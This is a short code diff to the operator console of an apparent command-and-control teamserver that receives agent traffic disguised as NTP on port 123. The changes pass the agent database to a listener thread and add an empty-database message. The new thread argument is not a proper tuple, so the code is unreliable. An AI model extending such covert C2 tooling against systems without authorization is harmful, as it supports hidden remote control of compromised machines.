@@ -21,7 +21,7 @@ class Teamserver:
             exit()
         """
         print("Listening for NTP traffic on port 123")
-        self.thread = Thread(target=listener.start, args=(), daemon=True)
+        self.thread = Thread(target=listener.start, args=(self.agentDB), daemon=True)
         self.thread.start()           
         system('clear')
 
@@ -34,6 +34,10 @@ class Teamserver:
     #display the board of active c2s, call again to refresh
     def displayBoard(self):
         data = self.agentDB.dbPull()
+        if len(data) == 0:
+            print(colored(" No Agents in DB!\n", "red"))
+            return
+
         for entry in data:
             if entry[3] == "DEAD":
                 color = "red"
@@ -47,6 +51,7 @@ class Teamserver:
                             "\t| Service ~ " + str(entry[2]) + 
                             "\t| Status ~ " + str(entry[3]) + "\n"
                             , color=color))
+    
     
     def printOutput(self): #?does this go somewhere else
         pass #print command output
